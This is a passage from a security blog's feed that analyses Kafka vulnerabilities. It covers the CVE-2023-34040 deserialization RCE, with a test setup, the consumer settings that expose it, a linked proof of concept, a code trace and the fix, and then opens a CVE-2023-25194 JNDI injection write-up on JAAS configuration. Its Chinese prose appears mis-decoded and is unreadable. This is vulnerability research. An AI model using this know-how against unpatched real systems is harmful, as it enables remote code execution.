class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ProducerController</span> &#123;  </span><br><span class="line">    <span class="meta">@Autowired</span>  </span><br><span class="line">    <span class="keyword">private</span> KafkaTemplate&lt;String,String&gt; kafkaTemplate;  </span><br><span class="line">  </span><br><span class="line">    <span class="meta">@PostMapping(&quot;/fireAndForget&quot;)</span>  </span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">fireAndForget</span><span class="params">()</span> &#123;  </span><br><span class="line">        kafkaTemplate.send(KafkaInfo.TOPIC_WELCOME, <span class="string">&quot;fireAndForget:&quot;</span> + LocalDateTime.now());  </span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;success&quot;</span>;  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æ¶ˆè´¹è€…å¯ä»¥ä½¿ç”¨ <code>@KafkaListener</code> æ³¨è§£æ¥ç›‘å¬ Kafka é›†ç¾¤ä¸­çš„æ¶ˆæ¯ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.drunkbaby.springkafkatest.consumer;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">import</span> com.drunkbaby.springkafkatest.common.KafkaInfo;  </span><br><span class="line"><span class="keyword">import</span> org.springframework.kafka.annotation.KafkaListener;  </span><br><span class="line"><span class="keyword">import</span> org.springframework.messaging.MessageHeaders;  </span><br><span class="line"><span class="keyword">import</span> org.springframework.messaging.handler.annotation.Headers;  </span><br><span class="line"><span class="keyword">import</span> org.springframework.messaging.handler.annotation.Payload;  </span><br><span class="line"><span class="keyword">import</span> org.springframework.stereotype.Component;  </span><br><span class="line">  </span><br><span class="line"><span class="meta">@Component</span>  </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Consumer</span> &#123;  </span><br><span class="line">    <span class="meta">@KafkaListener(topics = KafkaInfo.TOPIC_WELCOME)</span>  </span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">consumer2</span><span class="params">(<span class="meta">@Payload</span> String message, <span class="meta">@Headers</span> MessageHeaders headers)</span> &#123;  </span><br><span class="line">        System.out.println(<span class="string">&quot;æ¶ˆè´¹è€…(æ³¨è§£æ–¹å¼)ï¼šæ”¶åˆ°æ¶ˆæ¯==&gt; &quot;</span>);  </span><br><span class="line">        System.out.println(<span class="string">&quot;  messageï¼š&quot;</span> + message);  </span><br><span class="line">        System.out.println(<span class="string">&quot;  headers:&quot;</span>);  </span><br><span class="line">        headers.keySet().forEach(key -&gt; System.out.println(<span class="string">&quot;    &quot;</span> + key + <span class="string">&quot;:&quot;</span> + headers.get(key)));  </span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;success&quot;</span>;  </span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>è¿æ¥æˆåŠŸ</p><img src="/2023/11/27/CVE-2023-34040-Kafka-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-RCE/SuccessConnectKafka.png" class><p>è®¿é—® <code>http://localhost:8083/producer/sync</code> å‘é€ä¸€æ¡è®°å½•</p><img src="/2023/11/27/CVE-2023-34040-Kafka-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-RCE/SuccessConnectKafka.png" class><h3 id="æ„é€ -payload"><a href="#æ„é€ -payload" class="headerlink" title="æ„é€  payload"></a>æ„é€  payload</h3><p>å®é™…å½±å“åˆ°çš„æ˜¯ Consumerï¼Œä¸” Consumer è¦è®¾ç½® <code>checkDeserExWhenKeyNull</code> æˆ– <code>checkDeserExWhenValueNull</code> ä¸º true </p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ConcurrentKafkaListenerContainerFactory&lt;String, Greeting&gt; factory = <span class="keyword">new</span> <span class="title class_">ConcurrentKafkaListenerContainerFactory</span>&lt;&gt;();  </span><br><span class="line">factory.getContainerProperties().setCheckDeserExWhenValueNull(<span class="literal">true</span>);  </span><br><span class="line">factory.getContainerProperties().setCheckDeserExWhenKeyNull(<span class="literal">true</span>);</span><br></pre></td></tr></table></figure><p>payload å‚è€ƒ <a class="link" href="https://github.com/Contrast-Security-OSS/Spring-Kafka-POC-CVE-2023-34040">https://github.com/Contrast-Security-OSS/Spring-Kafka-POC-CVE-2023-34040<i class="fas fa-external-link-alt"></i></a></p><h2 id="æ¼æ´åˆ†æ"><a href="#æ¼æ´åˆ†æ" class="headerlink" title="æ¼æ´åˆ†æ"></a>æ¼æ´åˆ†æ</h2><p>ä¸»è¦æ˜¯æ¥çœ‹ååºåˆ—åŒ–çš„éƒ¨åˆ†</p><p>æ–­ç‚¹ä¼šå…ˆèµ°åˆ° <code>org.springframework.kafka.listener.ListenerUtils#getExceptionFromHeader</code> æ–¹æ³•ï¼Œå®ƒè¿™é‡Œé¢ä¼šè·å–åˆ° PoC ä¸­çš„ <code>KEY_DESERIALIZER_EXCEPTION_HEADER</code>ï¼Œå¹¶å°†å…¶ä½œä¸º headers</p><img src="/2023/11/27/CVE-2023-34040-Kafka-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-RCE/key.png" class><p>å¾€ä¸‹è·Ÿè¿› <code>byteArrayToDeserializationException()</code> æ–¹æ³•ï¼Œè¿™é‡Œå°±ç›´æ¥åˆ°ååºåˆ—åŒ–çš„éƒ¨åˆ†äº†ï¼Œè€Œåœ¨ååºåˆ—åŒ–ä¹‹å‰åšäº†ä¸€æ¬¡ <code>resolveClass()</code> çš„æ ¡éªŒã€‚</p><img src="/2023/11/27/CVE-2023-34040-Kafka-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-RCE/resolveClass.png" class><p>è€Œè¿™é‡Œçš„ <code>resolveClass()</code> æ ¡éªŒæ˜¯ä¸€æ¬¡æ€§çš„ï¼Œè¿™å°±ä»£è¡¨æˆ‘ä»¬å¯ä»¥æ„é€ å…¶ä»–çš„ Payloadï¼Œå¦‚ CC é“¾ç­‰ï¼Œè¯å®æ˜¯å¯ä»¥æ‰“é€šçš„</p><img src="/2023/11/27/CVE-2023-34040-Kafka-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-RCE/readObject.png" class><p>ä¹‹åä¾¿ä¼šè¿›å…¥åˆ°å¯¹åº”ç±»çš„ <code>readObject()</code> æ–¹æ³•</p><h2 id="æ¼æ´ä¿®å¤"><a href="#æ¼æ´ä¿®å¤" class="headerlink" title="æ¼æ´ä¿®å¤"></a>æ¼æ´ä¿®å¤</h2><p><a class="link" href="https://github.com/spring-projects/spring-kafka/commit/25ac793a78725e2ca4a3a2888a1506a4bfcf0c9d">https://github.com/spring-projects/spring-kafka/commit/25ac793a78725e2ca4a3a2888a1506a4bfcf0c9d<i class="fas fa-external-link-alt"></i></a></p><p>ç›¸å½“äºæŠŠè¿™é‡Œçš„ header å¤´åŠ é»‘äº†</p><img src="/2023/11/27/CVE-2023-34040-Kafka-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-RCE/blackHeader.png" class>]]></content>
    
    
    <summary type="html">CVE-2023-34040 æ¼æ´åˆ†æ</summary>
    
    
    
    <category term="æ¼æ´å¤ç°" scheme="https://drun1baby.github.io/categories/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
    
    
    <category term="æ¼æ´å¤ç°" scheme="https://drun1baby.github.io/tags/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
    
    <category term="Java" scheme="https://drun1baby.github.io/tags/Java/"/>
    
  </entry>
  
  <entry>
    <title>CVE-2023-25194 Kafka Jndi æ³¨å…¥</title>
    <link href="https://drun1baby.github.io/2023/11/27/CVE-2023-25194-Kafka-Jndi-%E6%B3%A8%E5%85%A5/"/>
    <id>https://drun1baby.github.io/2023/11/27/CVE-2023-25194-Kafka-Jndi-%E6%B3%A8%E5%85%A5/</id>
    <published>2023-11-27T01:47:37.000Z</published>
    <updated>2023-11-27T01:53:33.978Z</updated>
    
    <content type="html"><![CDATA[<h1 id="CVE-2023-25194-Kafka-Jndi-æ³¨å…¥"><a href="#CVE-2023-25194-Kafka-Jndi-æ³¨å…¥" class="headerlink" title="CVE-2023-25194 Kafka Jndi æ³¨å…¥"></a>CVE-2023-25194 Kafka Jndi æ³¨å…¥</h1><h2 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h2><p>æ¼æ´é€šå‘Šåœ°å€ï¼š<a class="link" href="https://kafka.apache.org/cve-list.html">https://kafka.apache.org/cve-list.html<i class="fas fa-external-link-alt"></i></a></p><p>éœ€è¦çœ‹çš„æ¼æ´åˆ—è¡¨ï¼š</p><ul><li>CVE-2022-23305ï¼ˆSQL æ³¨å…¥ï¼Œåé¢å‘ç°è¿˜æ˜¯ log4j çš„é—®é¢˜ï¼‰</li><li>CVE-2023-25194ï¼ˆJNDI æ³¨å…¥ <a class="link" href="https://github.com/Threekiii/Vulhub-Reproduce/blob/master/Apache%20Kafka%20Clients%20LDAP%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%20CVE-2023-25194.md%EF%BC%89">https://github.com/Threekiii/Vulhub-Reproduce/blob/master/Apache%20Kafka%20Clients%20LDAP%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%20CVE-2023-25194.mdï¼‰<i class="fas fa-external-link-alt"></i></a></li><li>CVE-2023-34040ï¼ˆååºåˆ—åŒ–æ”»å‡»ï¼‰</li></ul><p>ä¸»è¦æ˜¯è¿™ä¸‰ä¸ªæ¼æ´ï¼Œå…¶ä½™çš„ä¸€äº› CVE-2021 æˆ–æ˜¯ CVE-2022 å¾ˆå¤šéƒ½æ˜¯å—åˆ° log4j ç»„ä»¶çš„å½±å“</p><h1 id="CVE-2023-25194-JNDI-æ³¨å…¥åˆ†æ"><a href="#CVE-2023-25194-JNDI-æ³¨å…¥åˆ†æ" class="headerlink" title="CVE-2023-25194 JNDI æ³¨å…¥åˆ†æ"></a>CVE-2023-25194 JNDI æ³¨å…¥åˆ†æ</h1><h2 id="Apache-Kafka-Clients-Jndi-Injection"><a href="#Apache-Kafka-Clients-Jndi-Injection" class="headerlink" title="Apache Kafka Clients Jndi Injection"></a>Apache Kafka Clients Jndi Injection</h2><h3 id="æ¼æ´æè¿°"><a href="#æ¼æ´æè¿°" class="headerlink" title="æ¼æ´æè¿°"></a>æ¼æ´æè¿°</h3><p>Apache Kafka æ˜¯ä¸€ä¸ªåˆ†å¸ƒå¼æ•°æ®æµå¤„ç†å¹³å°ï¼Œå¯ä»¥å®æ—¶å‘å¸ƒã€è®¢é˜…ã€å­˜å‚¨å’Œå¤„ç†æ•°æ®æµã€‚Kafka Connect æ˜¯ä¸€ç§ç”¨äºåœ¨ kafka å’Œå…¶ä»–ç³»ç»Ÿä¹‹é—´å¯æ‰©å±•ã€å¯é çš„æµå¼ä¼ è¾“æ•°æ®çš„å·¥å…·ã€‚æ”»å‡»è€…å¯ä»¥åˆ©ç”¨åŸºäº SASL JAAS é…ç½®å’Œ SASL åè®®çš„ä»»æ„ Kafka å®¢æˆ·ç«¯ï¼Œå¯¹ Kafka Connect worker åˆ›å»ºæˆ–ä¿®æ”¹è¿æ¥å™¨æ—¶ï¼Œé€šè¿‡æ„é€ ç‰¹æ®Šçš„é…ç½®ï¼Œè¿›è¡Œ JNDI æ³¨å…¥æ¥å®ç°è¿œç¨‹ä»£ç æ‰§è¡Œã€‚</p><h3 id="å½±å“èŒƒå›´"><a href="#å½±å“èŒƒå›´" class="headerlink" title="å½±å“èŒƒå›´"></a>å½±å“èŒƒå›´</h3><p>2.4.0 &lt;&#x3D; Apache Kafka &lt;&#x3D; 3.3.2</p><h3 id="å‰ç½®çŸ¥è¯†"><a href="#å‰ç½®çŸ¥è¯†" class="headerlink" title="å‰ç½®çŸ¥è¯†"></a>å‰ç½®çŸ¥è¯†</h3><h4 id="Kafka-æ˜¯ä»€ä¹ˆ"><a href="#Kafka-æ˜¯ä»€ä¹ˆ" class="headerlink" title="Kafka æ˜¯ä»€ä¹ˆ"></a>Kafka æ˜¯ä»€ä¹ˆ</h4><p>Kafka æ˜¯ä¸€ä¸ªå¼€æºçš„åˆ†å¸ƒå¼æ¶ˆæ¯ç³»ç»Ÿï¼ŒKafka å¯ä»¥å¤„ç†å¤§é‡çš„æ¶ˆæ¯å’Œæ•°æ®æµï¼Œå…·æœ‰é«˜ååé‡ã€ä½å»¶è¿Ÿã€å¯æ‰©å±•æ€§ç­‰ç‰¹ç‚¹ã€‚å®ƒè¢«å¹¿æ³›åº”ç”¨äºå¤§æ•°æ®é¢†åŸŸï¼Œå¦‚æ—¥å¿—æ”¶é›†ã€æ•°æ®ä¼ è¾“ã€æµå¤„ç†ç­‰åœºæ™¯ã€‚</p><p>æ„Ÿè§‰ä¸Šå’Œ RocketMQ å¾ˆç±»ä¼¼ï¼Œä¸»è¦åŠŸèƒ½éƒ½æ˜¯ç”¨æ¥è¿›è¡Œæ•°æ®ä¼ è¾“çš„ã€‚</p><h4 id="Kafka-å®¢æˆ·ç«¯-SASL-JAAS-é…ç½®"><a href="#Kafka-å®¢æˆ·ç«¯-SASL-JAAS-é…ç½®" class="headerlink" title="Kafka å®¢æˆ·ç«¯ SASL JAAS é…ç½®"></a>Kafka å®¢æˆ·ç«¯ SASL JAAS é…ç½®</h4><p>ç®€å•è®¤è¯ä¸å®‰å…¨å±‚ (SASL, Simple Authentication and Security Layer ) æ˜¯ä¸€ä¸ªåœ¨ç½‘ç»œåè®®ä¸­ç”¨æ¥è®¤è¯å’Œæ•°æ®åŠ å¯†çš„æ„æ¶ï¼Œåœ¨ Kafka çš„å®é™…åº”ç”¨å½“ä¸­è¡¨ç°ä¸º JAASã€‚</p><p>Java è®¤è¯å’ŒæˆæƒæœåŠ¡ï¼ˆJava Authentication and Authorization Serviceï¼Œç®€ç§° JAASï¼‰æ˜¯ä¸€ä¸ª Java ä»¥ç”¨æˆ·ä¸ºä¸­å¿ƒçš„å®‰å…¨æ¡†æ¶ï¼Œä½œä¸º Java ä»¥ä»£ç ä¸ºä¸­å¿ƒçš„å®‰å…¨çš„è¡¥å……ã€‚æ€»ç»“ä¸€ä¸‹å°±æ˜¯ç”¨äºè®¤è¯ã€‚æœ‰è¶£çš„æ˜¯ <strong>Shiro (JSecurity)</strong> æœ€åˆè¢«å¼€å‘å‡ºæ¥çš„åŸå› å°±æ˜¯ç”±äºå½“æ—¶ JAAS å­˜åœ¨ç€è®¸å¤šç¼ºç‚¹</p><p>å‚è€ƒè‡ª <a class="link" href="https://blog.csdn.net/yinxuep/article/details/103242969">https://blog.csdn.net/yinxuep/article/details/103242969<i class="fas fa-external-link-alt"></i></a> è¿˜æœ‰ä¸€äº›ç»†å¾®çš„é…ç½®è¿™é‡Œä¸å†å±•å¼€ã€‚åŠ¨æ€è®¾ç½®å’Œé™æ€ä¿®æ”¹ <code>.conf</code> æ–‡ä»¶å®é™…ä¸Šæ•ˆæœæ˜¯ä¸€è‡´çš„ã€‚</p><h5 id="æœåŠ¡ç«¯é…ç½®"><a href="#æœåŠ¡ç«¯é…ç½®" class="headerlink" title="æœåŠ¡ç«¯é…ç½®"></a>æœåŠ¡ç«¯é…ç½®</h5><p>1ã€é€šå¸¸åœ¨æœåŠ¡å™¨èŠ‚ç‚¹ä¸‹é…ç½®æœåŠ¡å™¨ JASS æ–‡ä»¶ï¼Œä¾‹å¦‚è¿™é‡Œæˆ‘ä»¬å°†å…¶å‘½åä¸º <code>kafka_server_jaas.conf</code>ï¼Œå†…å®¹å¦‚ä¸‹</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">KafkaServer &#123;</span><br><span class="line">    org.apache.kafka.common.security.plain.PlainLoginModule required</span><br><span class="line">    username=&quot;eystar&quot;</span><br><span class="line">    password=&quot;eystar8888&quot;</span><br><span class="line">    user_eystar=&quot;eystar8888&quot;</span><br><span class="line">    user_yxp=&quot;yxp-secret&quot;;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p><strong>è¯´æ˜ï¼š</strong></p><p>username +password è¡¨ç¤º kafka é›†ç¾¤ç¯å¢ƒå„ä¸ªä»£ç†ä¹‹é—´è¿›è¡Œé€šä¿¡æ—¶ä½¿ç”¨çš„èº«ä»½éªŒè¯ä¿¡æ¯ã€‚</p><p><code>user_eystar=&quot;eystar8888&quot;</code> è¡¨ç¤ºå®šä¹‰å®¢æˆ·ç«¯è¿æ¥åˆ°ä»£ç†çš„ç”¨æˆ·ä¿¡æ¯ï¼Œå³åˆ›å»ºä¸€ä¸ªç”¨æˆ·åä¸º eystarï¼Œå¯†ç ä¸º eystar8888 çš„ç”¨æˆ·èº«ä»½ä¿¡æ¯ï¼Œkafka ä»£ç†å¯¹å…¶è¿›è¡Œèº«ä»½éªŒè¯ï¼Œå¯ä»¥åˆ›å»ºå¤šä¸ªç”¨æˆ·ï¼Œæ ¼å¼ <code>user_XXX=â€XXXâ€</code></p><p>2ã€å¦‚æœå¤„äºé™æ€ä½¿ç”¨ä¸­ï¼Œéœ€è¦å°†å…¶åŠ å…¥åˆ° JVM å¯åŠ¨å‚æ•°ä¸­ï¼Œå¦‚ä¸‹</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> [ <span class="string">&quot;x<span class="variable">$KAFKA_OPTS</span>&quot;</span> ]; <span class="keyword">then</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">export</span> KAFKA_OPTS=<span class="string">&quot;-Djava.security.auth.login.config=/opt/modules/kafka_2.11-2.0.0/config/kafka_server_jaas.conf&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">fi</span></span><br></pre></td></tr></table></figure><p><a class="link" href="https://kafka.apache.org/documentation/#brokerconfigs_sasl.jaas.config">https://kafka.apache.org/documentation/#brokerconfigs_sasl.jaas.config<i class="fas fa-external-link-alt"></i></a></p><h5 id="å®¢æˆ·ç«¯é…ç½®"><a href="#å®¢æˆ·ç«¯é…ç½®" class="headerlink" title="å®¢æˆ·ç«¯é…ç½®"></a>å®¢æˆ·ç«¯é…ç½®</h5><p>åŸºæœ¬åŒæœåŠ¡ç«¯ä¸€è‡´ï¼Œå¦‚ä¸‹æ­¥éª¤</p><p>1ã€é…ç½®å®¢æˆ·ç«¯ JAAS æ–‡ä»¶ï¼Œå‘½åä¸º <code>kafka_client_jaas.conf</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">KafkaClient &#123;</span><br><span class="line">        org.apache.kafka.common.security.plain.PlainLoginModule required</span><br><span class="line">        username=&quot;eystar&quot;</span><br><span class="line">        password=&quot;eystar8888&quot;;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>2ã€JAVA è°ƒç”¨çš„ Kafka Client å®¢æˆ·ç«¯è¿æ¥æ—¶æŒ‡å®šé…ç½®å±æ€§ <code>sasl.jaas.config</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">sasl.jaas.config=org.apache.kafka.common.security.plain.PlainLoginModule required \</span><br><span class="line">    username=<span class="string">&quot;eystar&quot;</span> \</span><br><span class="line">password=<span class="string">&quot;eystar8888&quot;</span>;</span><br><span class="line"><span class="comment">// å³é…ç½®å±æ€§ï¼šï¼ˆåç»­ä¼šè®²åˆ°ä¹Ÿèƒ½å¤ŸåŠ¨æ€é…ç½®ï¼Œè®©æˆ‘æƒ³èµ·äº† RocketMQï¼‰</span></span><br><span class="line">Pro.set(â€œsasl.jaas.configâ€,â€org.apache.kafka.common.security.plain.PlainLoginModule required username=\<span class="string">&quot;eystar\&quot; password=\&quot;eystar8888\&quot;;&quot;</span>;</span><br><span class="line">â€);</span><br></pre></td></tr></table></figure><h4 id="Kafka-å®¢æˆ·ç«¯åŠ¨æ€ä¿®æ”¹-JAAS-é…ç½®"><a href="#Kafka-å®¢æˆ·ç«¯åŠ¨æ€ä¿®æ”¹-JAAS-é…ç½®" class="headerlink" title="Kafka å®¢æˆ·ç«¯åŠ¨æ€ä¿®æ”¹ JAAS é…ç½®"></a>Kafka å®¢æˆ·ç«¯åŠ¨æ€ä¿®æ”¹ JAAS é…ç½®</h4><p>æ–¹å¼ä¸€ï¼šé…ç½® Properties å±æ€§ï¼Œå¯ä»¥æ³¨æ„åˆ°è¿™ä¸€ä¸ªå­—æ®µçš„é”®åä¸º <code>sasl.jaas.config</code>ï¼Œå®ƒçš„æ ¼å¼å¦‚ä¸‹</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">loginModuleClass controlFlag (optionName=optionValue)*;</span><br></pre></td></tr></table></figure><p>å…¶ä¸­çš„ loginModuleClass ä»£è¡¨è®¤è¯æ–¹å¼, ä¾‹å¦‚ LDAP, Kerberos, Unix è®¤è¯ï¼Œå¯ä»¥å‚è€ƒå®˜æ–¹æ–‡æ¡£ <a class="link" href="https://docs.oracle.com/javase/8/docs/technotes/guides/security/jgss/tutorials/LoginConfigFile.html">https://docs.oracle.com/javase/8/docs/technotes/guides/security/jgss/tutorials/LoginConfigFile.html<i class="fas fa-external-link-alt"></i></a> å…¶ä¸­æœ‰ä¸€å¤„ä¸º <code>JndiLoginModule</code>ï¼ŒJDK è‡ªå¸¦çš„ loginModule ä½äºÂ <code>com.sun.security.auth.module</code></p><img src="/2023/11/27/CVE-2023-25194-Kafka-Jndi-%E6%B3%A8%E5%85%A5/module.png" class><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//å®‰å…¨æ¨¡å¼ ç”¨æˆ·å å¯†ç </span></span><br><span class="line">props.setProperty(<span class="string">&quot;sasl.jaas.config&quot;</span>, <span class="string">&quot;org.apache.kafka.common.security.plain.PlainLoginModule required username=\&quot;usn\&quot; password=\&quot;pwd\&quot;;&quot;</span>);</span><br><span class="line">props.setProperty(<span class="string">&quot;security.protocol&quot;</span>, <span class="string">&quot;SASL_PLAINTEXT&quot;</span>);</span><br><span class="line">props.setProperty(<span class="string">&quot;sasl.mechanism&quot;</span>, <span class="string">&quot;PLAIN&quot;</span>);</span><br></pre></td></tr></table></figure><p>æ–¹å¼äºŒï¼šè®¾ç½®ç³»ç»Ÿå±æ€§å‚æ•°</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// æŒ‡å®škafka_client_jaas.confæ–‡ä»¶è·¯å¾„ </span></span><br><span class="line"><span class="type">String</span> <span class="variable">confPath</span> <span class="operator">=</span> TestKafkaComsumer.class.getResource(<span class="string">&quot;/&quot;</span>).getPath()+ <span class="string">&quot;/kafka_client_jaas.conf&quot;</span>; </span><br><span class="line">System.setProperty(<span class="string">&quot;java.security.auth.login.config&quot;</span>, confPath);</span><br></pre></td></tr></table></figure><h4 id="å®ç°ä»£ç "><a href="#å®ç°ä»£ç " class="headerlink" title="å®ç°ä»£ç "></a>å®ç°ä»£ç </h4><p><strong>æ¶ˆè´¹è€…</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TestComsumer</span> &#123;</span><br><span class="line"></span><br><span class="line">   <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line"></span><br><span class="line">        <span class="type">Properties</span> <span class="variable">props</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Properties</span>();</span><br><span class="line">        props.put(<span class="string">&quot;bootstrap.servers&quot;</span>, <span class="string">&quot;192.168.1.176:9092&quot;</span>);</span><br><span class="line">        props.put(<span class="string">&quot;group.id&quot;</span>, <span class="string">&quot;test_group&quot;</span>);</span><br><span class="line">        props.put(<span class="string">&quot;enable.auto.commit&quot;</span>, <span class="string">&quot;true&quot;</span>);</span><br><span class="line">        props.put(<span class="string">&quot;auto.commit.interval.ms&quot;</span>, <span class="string">&quot;1000&quot;</span>);</span><br><span class="line">        props.put(<span class="string">&quot;key.deserializer&quot;</span>,</span><br><span class="line">                <span class="string">&quot;org.apache.kafka.common.serialization.StringDeserializer&quot;</span>);</span><br><span class="line">        props.put(<span class="string">&quot;value.deserializer&quot;</span>,</span><br><span class="line">                <span class="string">&quot;org.apache.kafka.common.serialization.StringDeserializer&quot;</span>);</span><br><span class="line">        <span class="comment">// sasl.jaas.configçš„é…ç½®</span></span><br><span class="line">        props.setProperty(<span class="string">&quot;sasl.jaas.config&quot;</span>, <span class="string">&quot;org.apache.kafka.common.security.plain.PlainLoginModule required username=\&quot;usn\&quot; password=\&quot;pwd\&quot;;&quot;</span>);</span><br><span class="line">        props.setProperty(<span class="string">&quot;security.protocol&quot;</span>, <span class="string">&quot;SASL_PLAINTEXT&quot;</span>);</span><br><span class="line">        props.setProperty(<span class="string">&quot;sasl.mechanism&quot;</span>, <span class="string">&quot;PLAIN&quot;</span>);</span><br><span class="line"></span><br><span class="line">        KafkaConsumer&lt;String, String&gt; consumer = <span class="keyword">new</span> <span class="title class_">KafkaConsumer</span>&lt;&gt;(props);</span><br><span class="line">        consumer.subscribe(Arrays.asList(<span class="string">&quot;topic_name&quot;</span>));</span><br><span class="line">        <span class="keyword">while</span> (<span class="literal">true</span>) &#123;</span><br><span class="line">           <span class="keyword">try</span> &#123;</span><br><span class="line">                ConsumerRecords&lt;String, String&gt; records = consumer.poll(Duration</span><br><span class="line">                        .ofMillis(<span class="number">100</span>));</span><br><span class="line">                <span class="keyword">for</span> (ConsumerRecord&lt;String, String&gt; record : records)</span><br><span class="line">                    System.out.printf(<span class="string">&quot;offset = %d, partition = %d, key = %s, value = %s%n&quot;</span>,</span><br><span class="line">                            record.offset(), record.partition(), record.key(), record.value());</span><br><span class="line">          </span><br><span class="line">            &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">                e.printStackTrace();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    </span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>ç”Ÿäº§è€…</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TestProduce</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String args[])</span> &#123;</span><br><span class="line"></span><br><span class="line">        <span class="type">Properties</span> <span class="variable">props</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Properties</span>();</span><br><span class="line"></span><br><span class="line">        props.put(<span 